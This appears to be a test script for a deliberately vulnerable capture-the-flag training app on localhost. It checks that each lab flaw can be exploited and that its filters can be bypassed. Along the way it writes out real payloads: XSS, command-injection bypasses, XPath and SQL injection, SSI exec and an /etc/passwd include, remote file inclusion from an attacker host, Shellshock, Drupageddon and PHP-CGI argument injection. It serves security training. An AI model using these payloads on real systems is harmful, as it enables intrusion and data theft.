const http = require("http");

function req(method, path, { cookies = "", body, headers = {} } = {}) {
  return new Promise((resolve, reject) => {
    const data = body ? JSON.stringify(body) : null;
    const opts = {
      host: "localhost", port: 3000, path, method,
      headers: Object.assign({}, headers, cookies ? { Cookie: cookies } : {}, data ? { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(data) } : {})
    };
    const r = http.request(opts, (res) => {
      let chunks = [];
      res.on("data", (c) => chunks.push(c));
      res.on("end", () => resolve({ status: res.statusCode, headers: res.headers, body: Buffer.concat(chunks).toString(), setCookie: res.headers["set-cookie"] || [] }));
    });
    r.setTimeout(4000, () => { r.destroy(new Error("client timeout after 4s: " + method + " " + path)); });
    r.on("error", reject);
    if (data) r.write(data);
    r.end();
  });
}
// hard overall deadline so a single stuck request can never hang the whole suite silently
setTimeout(() => { console.log("\n!!! GLOBAL DEADLINE HIT (60s) — dumping progress and exiting !!!"); console.log(`=== ${pass} passed, ${fail} failed (incomplete) ===`); process.exit(2); }, 60000).unref();
function cookieStr(setCookieArr, existing) {
  const jar = {};
  (existing || "").split(";").forEach((p) => { const [k, v] = p.trim().split("="); if (k) jar[k] = v; });
  (setCookieArr || []).forEach((sc) => { const [kv] = sc.split(";"); const [k, v] = kv.split("="); jar[k] = v; });
  return Object.entries(jar).filter(([k]) => k).map(([k, v]) => `${k}=${v}`).join("; ");
}
function hasFlag(body) { return /FLAG\{[^}]+\}/.test(body); }

let pass = 0, fail = 0;
function check(name, condition, extra) {
  if (condition) { pass++; console.log("PASS:", name); }
  else { fail++; console.log("FAIL:", name, extra || ""); }
}

async function run() {
  // ---------- html-injection ----------
  {
    let r = await req("GET", "/vuln/html-injection?difficulty=easy&bio=" + encodeURIComponent("<h1>DEFACED</h1>"));
    check("html-injection easy: tag injection -> flag", hasFlag(r.body), r.body.slice(0, 200));
    let cookies = cookieStr(r.setCookie, "");
    let r2 = await req("GET", "/vuln/html-injection?difficulty=easy&bio=" + encodeURIComponent("plain text no tags"), { cookies });
    check("html-injection easy: plain text -> NO flag", !hasFlag(r2.body));

    let r3 = await req("GET", "/vuln/html-injection?difficulty=medium&bio=" + encodeURIComponent("<script>alert(1)</script>"));
    check("html-injection medium: <script> alone blocked -> NO flag", !hasFlag(r3.body), r3.body.match(/Bio:[^\n]*/) || "");
    let c3 = cookieStr(r3.setCookie, "");
    let r4 = await req("GET", "/vuln/html-injection?difficulty=medium&bio=" + encodeURIComponent("<h1>stored</h1>"), { cookies: c3 });
    check("html-injection medium: non-script tag stored -> flag", hasFlag(r4.body));

    let r5 = await req("GET", '/vuln/html-injection?difficulty=hard&bio=' + encodeURIComponent('normal text'));
    check("html-injection hard: no quote breakout -> NO flag", !hasFlag(r5.body));
    let r6 = await req("GET", '/vuln/html-injection?difficulty=hard&bio=' + encodeURIComponent('" onmouseover="x'));
    check("html-injection hard: attribute breakout -> flag", hasFlag(r6.body));
  }

  // ---------- mail-header-injection ----------
  {
    let r = await req("GET", "/vuln/mail-header-injection/send?difficulty=easy&name=Jordan&email=" + encodeURIComponent("jordan@example.com\r\nBcc: attacker@evil.test") + "&message=hi");
    check("mail-header-injection easy: CRLF in email -> flag", hasFlag(r.body));
    let r2 = await req("GET", "/vuln/mail-header-injection/send?difficulty=easy&name=Jordan&email=jordan@example.com&message=hi");
    check("mail-header-injection easy: clean input -> NO flag", !hasFlag(r2.body));

    let r3 = await req("GET", "/vuln/mail-header-injection/send?difficulty=medium&name=Jordan&email=" + encodeURIComponent("j@example.com\r\nBcc: x@evil.test") + "&message=hi");
    check("mail-header-injection medium: email field filtered -> NO flag", !hasFlag(r3.body));
    let r4 = await req("GET", "/vuln/mail-header-injection/send?difficulty=medium&name=" + encodeURIComponent("Jordan\r\nBcc: x@evil.test") + "&email=j@example.com&message=hi");
    check("mail-header-injection medium: name field bypass -> flag", hasFlag(r4.body));

    let r5 = await req("GET", "/vuln/mail-header-injection/send?difficulty=hard&name=" + encodeURIComponent("Jordan\u2028Bcc: x@evil.test") + "&email=j@example.com&message=hi");
    check("mail-header-injection hard: unicode line separator bypass -> flag", hasFlag(r5.body));
  }

  // ---------- code-injection ----------
  {
    let r = await req("GET", "/vuln/code-injection?difficulty=easy&formula=" + encodeURIComponent("process.version"));
    check("code-injection easy: process. -> flag", hasFlag(r.body));
    let r2 = await req("GET", "/vuln/code-injection?difficulty=easy&formula=" + encodeURIComponent("(100-15)"));
    check("code-injection easy: pure arithmetic -> NO flag, real eval", !hasFlag(r2.body) && r2.body.includes("85"));

    let r3 = await req("GET", "/vuln/code-injection?difficulty=medium&formula=" + encodeURIComponent("process.version"));
    check("code-injection medium: raw 'process' blocked -> NO flag", !hasFlag(r3.body));
    let r4 = await req("GET", "/vuln/code-injection?difficulty=medium&formula=" + encodeURIComponent("'proc'+'ess'"));
    check("code-injection medium: concatenation reconstructed -> flag", hasFlag(r4.body));

    let r5 = await req("GET", "/vuln/code-injection?difficulty=hard&formula=" + encodeURIComponent("'proc'+'ess'"));
    check("code-injection hard: concatenation blocked -> NO flag", !hasFlag(r5.body));
    let r6 = await req("GET", "/vuln/code-injection?difficulty=hard&formula=" + encodeURIComponent("String.fromCharCode(112,114,111,99,101,115,115)"));
    check("code-injection hard: charcode bypass -> flag", hasFlag(r6.body));
  }

  // ---------- blind-command-injection ----------
  {
    let start = Date.now();
    let r = await req("GET", "/vuln/blind-command-injection?difficulty=easy&host=" + encodeURIComponent("10.0.0.5; sleep 2"));
    let elapsed = Date.now() - start;
    check("blind-command-injection easy: sleep 2 -> flag + real delay", hasFlag(r.body) && elapsed >= 1900, "elapsed=" + elapsed);

    let r2 = await req("GET", "/vuln/blind-command-injection?difficulty=medium&host=" + encodeURIComponent("10.0.0.5; sleep 2"));
    check("blind-command-injection medium: ; filtered -> NO flag", !hasFlag(r2.body));
    let r3 = await req("GET", "/vuln/blind-command-injection?difficulty=medium&host=" + encodeURIComponent("10.0.0.5 | sleep 2"));
    check("blind-command-injection medium: pipe bypass -> flag", hasFlag(r3.body));

    let r4 = await req("GET", "/vuln/blind-command-injection?difficulty=hard&host=" + encodeURIComponent("10.0.0.5 | sleep 2"));
    check("blind-command-injection hard: pipe filtered -> NO flag", !hasFlag(r4.body));
    let r5 = await req("GET", "/vuln/blind-command-injection?difficulty=hard&host=" + encodeURIComponent("10.0.0.5 $(sleep 2)"));
    check("blind-command-injection hard: $() bypass -> flag", hasFlag(r5.body));
  }

  // ---------- xpath-injection ----------
  {
    let r = await req("GET", "/vuln/xpath-injection?difficulty=easy&username=" + encodeURIComponent("' or '1'='1") + "&password=x");
    check("xpath-injection easy: tautology -> flag", hasFlag(r.body));
    let r2 = await req("GET", "/vuln/xpath-injection?difficulty=easy&username=nobody&password=wrong");
    check("xpath-injection easy: no injection -> NO flag", !hasFlag(r2.body));

    let r3 = await req("GET", "/vuln/xpath-injection?difficulty=medium&username=" + encodeURIComponent("' or '1'='1") + "&password=x");
    check("xpath-injection medium: username field still works -> flag (password fixed, username not)", hasFlag(r3.body));
    let r4 = await req("GET", "/vuln/xpath-injection?difficulty=medium&username=nobody&password=" + encodeURIComponent("' or '1'='1"));
    check("xpath-injection medium: password field fixed -> NO flag", !hasFlag(r4.body));

    let r5 = await req("GET", "/vuln/xpath-injection?difficulty=hard&username=" + encodeURIComponent("' or '1'='1") + "&password=x");
    check("xpath-injection hard: single-quote fixed everywhere -> NO flag", !hasFlag(r5.body));
    let r6 = await req("GET", '/vuln/xpath-injection?difficulty=hard&username=' + encodeURIComponent('" or "1"="1') + '&password=x');
    check("xpath-injection hard: double-quote breakout -> flag", hasFlag(r6.body));
  }

  // ---------- blind-sql-injection ----------
  {
    let r = await req("GET", "/vuln/blind-sql-injection?difficulty=easy&pid=" + encodeURIComponent("0 OR (SELECT COUNT(*) FROM admin_secrets WHERE token LIKE 'ADM%')>0"));
    check("blind-sql-injection easy: boolean pivot -> flag", hasFlag(r.body), r.body.match(/Query:[^\n]*/) || "");
    let r2 = await req("GET", "/vuln/blind-sql-injection?difficulty=easy&pid=1");
    check("blind-sql-injection easy: normal id -> NO flag", !hasFlag(r2.body));

    let r3 = await req("GET", "/vuln/blind-sql-injection?difficulty=medium&pid=" + encodeURIComponent("OR 1=1"));
    check("blind-sql-injection medium: non-digit-start rejected -> NO flag", !hasFlag(r3.body) && r3.body.includes("Invalid"));
    let r4 = await req("GET", "/vuln/blind-sql-injection?difficulty=medium&pid=" + encodeURIComponent("0 OR (SELECT COUNT(*) FROM admin_secrets)>0"));
    check("blind-sql-injection medium: digit-prefixed payload passes -> flag", hasFlag(r4.body));

    let r5 = await req("GET", "/vuln/blind-sql-injection?difficulty=hard&pid=" + encodeURIComponent("0 OR (SELECT COUNT(*) FROM admin_secrets)>0"));
    check("blind-sql-injection hard: pid fully anchored now -> NO flag", !hasFlag(r5.body) && r5.body.includes("Invalid"));
    let r6 = await req("GET", "/vuln/blind-sql-injection?difficulty=hard&pid=1", { headers: { "X-Debug-Filter": "(SELECT COUNT(*) FROM admin_secrets)>0" } });
    check("blind-sql-injection hard: debug header -> flag", hasFlag(r6.body));
  }

  // ---------- ssi-injection ----------
  {
    let r = await req("GET", '/vuln/ssi-injection?difficulty=easy&sig=' + encodeURIComponent('<!--#exec cmd="whoami" -->'));
    check("ssi-injection easy: exec -> flag", hasFlag(r.body));
    let r2 = await req("GET", "/vuln/ssi-injection?difficulty=medium&sig=" + encodeURIComponent('<!--#exec cmd="whoami" -->'));
    check("ssi-injection medium: exec blocked -> NO flag", !hasFlag(r2.body));
    let r3 = await req("GET", "/vuln/ssi-injection?difficulty=medium&sig=" + encodeURIComponent('<!--#include file="../../../etc/passwd" -->'));
    check("ssi-injection medium: include bypass -> flag", hasFlag(r3.body));
    let r4 = await req("GET", "/vuln/ssi-injection?difficulty=hard&sig=" + encodeURIComponent('<!--#include file="../../../etc/passwd" -->'));
    check("ssi-injection hard: include blocked too -> NO flag", !hasFlag(r4.body));
    let r5 = await req("GET", "/vuln/ssi-injection?difficulty=hard&sig=" + encodeURIComponent('<!--#printenv -->'));
    check("ssi-injection hard: printenv bypass -> flag", hasFlag(r5.body));
  }

  // ---------- rfi ----------
  {
    let r = await req("GET", "/vuln/rfi?difficulty=easy&tpl=" + encodeURIComponent("http://attacker-controlled.evil/shell.txt"));
    check("rfi easy: remote url -> flag", hasFlag(r.body));
    let r2 = await req("GET", "/vuln/rfi?difficulty=easy&tpl=en");
    check("rfi easy: local template name -> NO flag", !hasFlag(r2.body));

    let r3 = await req("GET", "/vuln/rfi?difficulty=medium&tpl=" + encodeURIComponent("https://evil.test/?securecorp-demo.test"));
    check("rfi medium: naive substring bypass -> flag", hasFlag(r3.body));
    let r4 = await req("GET", "/vuln/rfi?difficulty=medium&tpl=" + encodeURIComponent("https://cdn.securecorp-demo.test/ok.txt"));
    check("rfi medium: legit trusted host -> NO flag", !hasFlag(r4.body));

    let r5 = await req("GET", "/vuln/rfi?difficulty=hard&tpl=" + encodeURIComponent("https://evil.test/?securecorp-demo.test"));
    check("rfi hard: naive bypass fixed -> NO flag", !hasFlag(r5.body) && r5.body.includes("Blocked"));
    let r6 = await req("GET", "/vuln/rfi?difficulty=hard&tpl_fallback=" + encodeURIComponent("http://attacker-controlled.evil/shell.txt"));
    check("rfi hard: fallback param bypass -> flag", hasFlag(r6.body));
  }

  // ---------- cors-misconfig ----------
  {
    let r = await req("GET", "/vuln/cors-misconfig/api?difficulty=easy&simOrigin=" + encodeURIComponent("https://evil-attacker.test"));
    check("cors-misconfig easy: any origin reflected + creds -> flag", r.headers["access-control-allow-origin"] === "https://evil-attacker.test" && r.headers["access-control-allow-credentials"] === "true" && hasFlag(r.body));

    let r2 = await req("GET", "/vuln/cors-misconfig/api?difficulty=medium&simOrigin=" + encodeURIComponent("https://evil.test"));
    check("cors-misconfig medium: unrelated origin -> NO flag, no ACAO", !r2.headers["access-control-allow-origin"] && !hasFlag(r2.body));
    let r3 = await req("GET", "/vuln/cors-misconfig/api?difficulty=medium&simOrigin=" + encodeURIComponent("https://securecorp-demo.test.evil.test"));
    check("cors-misconfig medium: substring bypass -> flag", hasFlag(r3.body));

    let r4 = await req("GET", "/vuln/cors-misconfig/api?difficulty=hard&simOrigin=" + encodeURIComponent("https://securecorp-demo.test.evil.test"));
    check("cors-misconfig hard: substring bypass fixed -> NO flag", !hasFlag(r4.body));
    let r5 = await req("GET", "/vuln/cors-misconfig/api?difficulty=hard&simOrigin=" + encodeURIComponent("null"));
    check("cors-misconfig hard: null origin trusted -> flag", hasFlag(r5.body));
  }

  // ---------- header-xss ----------
  {
    let r = await req("GET", "/vuln/header-xss?difficulty=easy&ua=" + encodeURIComponent("<img src=x onerror=alert(1)>"));
    check("header-xss easy: UA injection -> flag", hasFlag(r.body));
    let c = cookieStr(r.setCookie, "");
    let r0 = await req("GET", "/vuln/header-xss?difficulty=easy", { cookies: c });
    check("header-xss easy no-injection baseline exists (sanity)", r0.status === 200);

    let r2 = await req("GET", "/vuln/header-xss?difficulty=medium&ua=" + encodeURIComponent("<script>alert(1)</script>"));
    check("header-xss medium: UA script blocked -> NO flag", !hasFlag(r2.body));
    let r3 = await req("GET", "/vuln/header-xss?difficulty=medium&referer=" + encodeURIComponent("<img src=x onerror=alert(1)>"));
    check("header-xss medium: referer bypass -> flag", hasFlag(r3.body));

    let r4 = await req("GET", "/vuln/header-xss?difficulty=hard&referer=" + encodeURIComponent("<img src=x onerror=alert(1)>"));
    check("header-xss hard: img/onerror blocked -> NO flag", !hasFlag(r4.body));
    let r5 = await req("GET", "/vuln/header-xss?difficulty=hard&referer=" + encodeURIComponent("<svg onbegin=alert(1)>"));
    check("header-xss hard: svg onbegin bypass -> flag", hasFlag(r5.body));
  }

  // ---------- clickjacking ----------
  {
    let r = await req("GET", "/vuln/clickjacking?difficulty=easy");
    check("clickjacking easy: no XFO/CSP header", !r.headers["x-frame-options"] && !r.headers["content-security-policy"]);
    let r2 = await req("GET", "/vuln/clickjacking?difficulty=medium");
    check("clickjacking medium: ALLOW-FROM (deprecated) set", (r2.headers["x-frame-options"] || "").includes("ALLOW-FROM"));
    let r3 = await req("GET", "/vuln/clickjacking?difficulty=hard");
    check("clickjacking hard: real SAMEORIGIN + frame-ancestors set, no flag in body", r3.headers["x-frame-options"] === "SAMEORIGIN" && (r3.headers["content-security-policy"] || "").includes("frame-ancestors") && !hasFlag(r3.body));
  }

  // ---------- client-side-validation-bypass ----------
  {
    let r = await req("POST", "/vuln/client-side-validation-bypass/apply?difficulty=easy", { body: { discountPct: 100 } });
    check("client-side-validation-bypass easy: 100% -> flag", hasFlag(r.body));
    let r2 = await req("POST", "/vuln/client-side-validation-bypass/apply?difficulty=medium", { body: { discountPct: 90 } });
    check("client-side-validation-bypass medium: 90% numeric passes range check -> flag", hasFlag(r2.body));
    let r3 = await req("POST", "/vuln/client-side-validation-bypass/apply?difficulty=hard", { body: { discountPct: 14 } });
    check("client-side-validation-bypass hard: top-level capped at 15 -> NO flag", !hasFlag(r3.body));
    let r4 = await req("POST", "/vuln/client-side-validation-bypass/apply?difficulty=hard", { body: { discountPct: 10, bulkItems: [{ item: "A", discountPct: 90 }] } });
    check("client-side-validation-bypass hard: nested bulkItems bypass -> flag", hasFlag(r4.body));
  }

  // ---------- captcha-bypass ----------
  {
    let r = await req("GET", "/vuln/captcha-bypass/login?difficulty=easy&username=admin&password=x&captcha=999999");
    let c = cookieStr(r.setCookie, "");
    let flag;
    for (let i = 0; i < 3; i++) { let ri = await req("GET", "/vuln/captcha-bypass/login?difficulty=easy&username=admin&password=x&captcha=999999", { cookies: c }); c = cookieStr(ri.setCookie, c); if (hasFlag(ri.body)) flag = true; }
    check("captcha-bypass easy: repeated wrong-captcha automated attempts -> flag eventually", flag);
  }
  {
    let r0 = await req("GET", "/vuln/captcha-bypass?difficulty=medium");
    let c = cookieStr(r0.setCookie, "");
    // solve once correctly (3+4=7 by default state)
    let flag;
    for (let i = 0; i < 3; i++) { let ri = await req("GET", "/vuln/captcha-bypass/login?difficulty=medium&username=admin&password=x&a=3&b=4&captcha=7", { cookies: c }); c = cookieStr(ri.setCookie, c); if (hasFlag(ri.body)) flag = true; }
    check("captcha-bypass medium: replayed static challenge -> flag", flag);
  }

  // ---------- insecure-cookie-flags ----------
  {
    let r = await req("GET", "/vuln/insecure-cookie-flags?difficulty=easy");
    const sc = (r.setCookie.find((s) => s.startsWith("authToken_ick")) || "");
    check("insecure-cookie-flags easy: cookie missing HttpOnly", sc && !/HttpOnly/i.test(sc), sc);
    let r2 = await req("GET", "/vuln/insecure-cookie-flags?difficulty=medium");
    const sc2 = (r2.setCookie.find((s) => s.startsWith("authToken_ick")) || "");
    check("insecure-cookie-flags medium: main cookie HAS HttpOnly", sc2 && /HttpOnly/i.test(sc2), sc2);
    let r3 = await req("GET", "/vuln/insecure-cookie-flags/remember-me?difficulty=medium");
    const sc3 = (r3.setCookie.find((s) => s.startsWith("authToken_ick")) || "");
    check("insecure-cookie-flags medium: remember-me cookie missing HttpOnly", sc3 && !/HttpOnly/i.test(sc3), sc3);
  }

  // ---------- session-id-in-url ----------
  {
    let r = await req("GET", "/vuln/session-id-in-url/dashboard?difficulty=easy&sessionid=victim-tok-9f21");
    check("session-id-in-url easy: admin token reuse -> flag", hasFlag(r.body));
    let r2 = await req("GET", "/vuln/session-id-in-url/access-log?difficulty=easy");
    check("session-id-in-url easy: log open with no restriction", r2.body.includes("victim-tok-9f21"));

    let r3 = await req("GET", "/vuln/session-id-in-url/access-log?difficulty=medium");
    check("session-id-in-url medium: log blocked without referer claim", r3.body.includes("restricted"));
    let r4 = await req("GET", "/vuln/session-id-in-url/access-log?difficulty=medium&simReferer=" + encodeURIComponent("/vuln/session-id-in-url/dashboard"));
    check("session-id-in-url medium: spoofed referer bypass", r4.body.includes("victim-tok-9f21"));
  }

  // ---------- weak-session-token ----------
  {
    let r = await req("GET", "/vuln/weak-session-token/account?difficulty=easy&token=1");
    check("weak-session-token easy: guess token '1' -> flag", hasFlag(r.body));
    let r2 = await req("GET", "/vuln/weak-session-token/debug-sessions?difficulty=easy");
    check("weak-session-token easy: debug endpoint not exposed", r2.status === 404);
    let r3 = await req("GET", "/vuln/weak-session-token/debug-sessions?difficulty=hard");
    check("weak-session-token hard: debug endpoint exposed", r3.status === 200 && r3.body.includes("admin"));
  }

  // ---------- broken-logout ----------
  {
    let r = await req("GET", "/vuln/broken-logout/login?difficulty=easy&username=jsmith");
    const tokMatch = r.body.match(/pill">([a-f0-9]+)</);
    const tok = tokMatch && tokMatch[1];
    await req("GET", `/vuln/broken-logout/logout?difficulty=easy&token=${tok}`);
    let r2 = await req("GET", `/vuln/broken-logout/account?difficulty=easy&token=${tok}`);
    check("broken-logout easy: old token still valid post-logout -> flag", hasFlag(r2.body));
  }
  {
    let r = await req("GET", "/vuln/broken-logout/login?difficulty=hard&username=jsmith");
    const tokMatch = r.body.match(/pill">([a-f0-9]+)</);
    const tok = tokMatch && tokMatch[1];
    await req("GET", `/vuln/broken-logout/logout?difficulty=hard&token=${tok}`);
    // immediately, within the race window
    let r2 = await req("GET", `/vuln/broken-logout/account?difficulty=hard&token=${tok}`);
    check("broken-logout hard: race window immediately after logout -> flag", hasFlag(r2.body));
    await new Promise((res) => setTimeout(res, 500));
    let r3 = await req("GET", `/vuln/broken-logout/account?difficulty=hard&token=${tok}`);
    check("broken-logout hard: after race window closes -> session invalid", r3.body.includes("invalid"));
  }

  // ---------- base64-secrets ----------
  {
    let r = await req("GET", "/vuln/base64-secrets/submit?difficulty=easy&decoded=" + encodeURIComponent("apiKey:SC-API-KEY-7f3d9c"));
    check("base64-secrets easy: correct decoded value -> flag", hasFlag(r.body));
    let r2 = await req("GET", "/vuln/base64-secrets/submit?difficulty=easy&decoded=wrong");
    check("base64-secrets easy: wrong value -> NO flag", !hasFlag(r2.body));
  }

  // ---------- heartbleed-sim ----------
  {
    let r = await req("GET", "/vuln/heartbleed-sim/beat?difficulty=easy&payload=PING&payload_length=200");
    check("heartbleed-sim easy: large overread -> flag", hasFlag(r.body));
    let r2 = await req("GET", "/vuln/heartbleed-sim/beat?difficulty=easy&payload=PING&payload_length=4");
    check("heartbleed-sim easy: honest length -> NO flag", !hasFlag(r2.body));

    let r3 = await req("GET", "/vuln/heartbleed-sim/beat?difficulty=hard&payload=PING&payload_length=300");
    check("heartbleed-sim hard: single request -> NO flag (needs repeat)", !hasFlag(r3.body));
  }

  // ---------- shellshock ----------
  {
    let r = await req("GET", "/vuln/shellshock/run?difficulty=easy&ua=" + encodeURIComponent("() { :; }; cat /etc/passwd"));
    check("shellshock easy: classic payload -> flag", hasFlag(r.body));
    let r2 = await req("GET", "/vuln/shellshock/run?difficulty=medium&ua=" + encodeURIComponent("() { :; }; cat /etc/passwd"));
    check("shellshock medium: naive check catches exact prefix -> NO flag", !hasFlag(r2.body));
    let r3 = await req("GET", "/vuln/shellshock/run?difficulty=medium&ua=" + encodeURIComponent(" () { :; }; cat /etc/passwd"));
    check("shellshock medium: leading space bypass -> flag", hasFlag(r3.body));
    let r4 = await req("GET", "/vuln/shellshock/run?difficulty=hard&ua=" + encodeURIComponent(" () { :; }; cat /etc/passwd"));
    check("shellshock hard: robust prefix check blocks leading-space variant -> NO flag", !hasFlag(r4.body));
    let r5 = await req("GET", "/vuln/shellshock/run?difficulty=hard&ua=" + encodeURIComponent("Mozilla/5.0 () { :; }; cat /etc/passwd"));
    check("shellshock hard: decoy-prefixed bypass -> flag", hasFlag(r5.body));
  }

  // ---------- drupageddon ----------
  {
    const SQLI_KEY = "x') OR ('1'='1";
    let r = await req("POST", "/vuln/drupageddon/comment?difficulty=easy", { body: { name: { [SQLI_KEY]: "y" }, email: "a@b.com" } });
    check("drupageddon easy: array-key injection -> flag", hasFlag(r.body), r.body.slice(0, 300));
    let r2 = await req("POST", "/vuln/drupageddon/comment?difficulty=medium", { body: { name: { [SQLI_KEY]: "y" }, email: "a@b.com" } });
    check("drupageddon medium: name field validated -> error not flag", !hasFlag(r2.body));
    let r3 = await req("POST", "/vuln/drupageddon/comment?difficulty=medium", { body: { name: "ok", email: { [SQLI_KEY]: "y" } } });
    check("drupageddon medium: email field bypass -> flag", hasFlag(r3.body), r3.body.slice(0, 300));
    let r4 = await req("POST", "/vuln/drupageddon/comment?difficulty=hard", { body: { name: "ok", email: "a@b.com", meta: { name: { [SQLI_KEY]: "y" } } } });
    check("drupageddon hard: nested meta.name bypass -> flag", hasFlag(r4.body), r4.body.slice(0, 300));
  }

  // ---------- php-cgi-rce ----------
  {
    let r = await req("GET", "/vuln/php-cgi-rce?difficulty=easy&-d+allow_url_include=1+-d+auto_prepend_file=php://input");
    check("php-cgi-rce easy: dangerous flags -> flag", hasFlag(r.body));
    let r2 = await req("GET", "/vuln/php-cgi-rce?difficulty=medium&-d+allow_url_include=1");
    check("php-cgi-rce medium: allow_url_include blocked -> NO flag", !hasFlag(r2.body));
    let r3 = await req("GET", "/vuln/php-cgi-rce?difficulty=medium&-d+auto_prepend_file=php://input");
    check("php-cgi-rce medium: auto_prepend_file bypass -> flag", hasFlag(r3.body));
    let r4 = await req("GET", "/vuln/php-cgi-rce?difficulty=hard&-d+auto_prepend_file=php://input");
    check("php-cgi-rce hard: auto_prepend_file blocked -> NO flag", !hasFlag(r4.body));
    let r5 = await req("GET", "/vuln/php-cgi-rce?difficulty=hard&-d+disable_functions=+-d+safe_mode=0");
    check("php-cgi-rce hard: disable_functions bypass -> flag", hasFlag(r5.body));
  }

  // ---------- xst ----------
  {
    let r1 = await req("GET", "/vuln/xst?difficulty=easy");
    let cookieHeader = (r1.setCookie.find((s) => s.startsWith("xst_authToken")) || "").split(";")[0];
    let rt = await req("TRACE", "/vuln/xst?difficulty=easy", { cookies: cookieHeader });
    check("xst easy: TRACE echoes HttpOnly cookie -> flag", hasFlag(rt.body), rt.body.slice(0, 150));

    let r2 = await req("GET", "/vuln/xst?difficulty=hard");
    let cookieHeader2 = (r2.setCookie.find((s) => s.startsWith("xst_authToken")) || "").split(";")[0];
    let rt2 = await req("TRACE", "/vuln/xst?difficulty=hard", { cookies: cookieHeader2 });
    check("xst hard: TRACE disabled on main path", rt2.status === 404 || rt2.status === 405, "status=" + rt2.status);
    let rt3 = await req("TRACE", "/vuln/xst/legacy?difficulty=hard", { cookies: cookieHeader2 });
    check("xst hard: legacy path still vulnerable -> flag", hasFlag(rt3.body));
  }

  // ---------- http-verb-tampering ----------
  {
    let r = await req("GET", "/vuln/http-verb-tampering/delete-user?difficulty=easy");
    check("http-verb-tampering easy: unprotected GET -> flag", hasFlag(r.body));
    let r2 = await req("POST", "/vuln/http-verb-tampering/delete-user?difficulty=easy");
    check("http-verb-tampering easy: POST still protected (viewer denied)", r2.status === 403);

    let r3 = await req("GET", "/vuln/http-verb-tampering/delete-user?difficulty=medium");
    check("http-verb-tampering medium: GET now protected", r3.status === 403);
    let r4 = await req("PUT", "/vuln/http-verb-tampering/delete-user?difficulty=medium");
    check("http-verb-tampering medium: PUT catch-all unprotected -> flag", hasFlag(r4.body));

    let r5 = await req("PUT", "/vuln/http-verb-tampering/delete-user?difficulty=hard");
    check("http-verb-tampering hard: PUT now protected/removed", r5.status === 404);
    let r6 = await req("POST", "/vuln/http-verb-tampering/delete-user?difficulty=hard", { headers: { "X-HTTP-Method-Override": "DELETE" } });
    check("http-verb-tampering hard: method-override bypass -> flag", hasFlag(r6.body));
  }

  console.log(`\n=== ${pass} passed, ${fail} failed ===`);
  process.exit(fail > 0 ? 1 : 0);
}
run().catch((e) => { console.error("TEST HARNESS ERROR:", e); process.exit(1); });
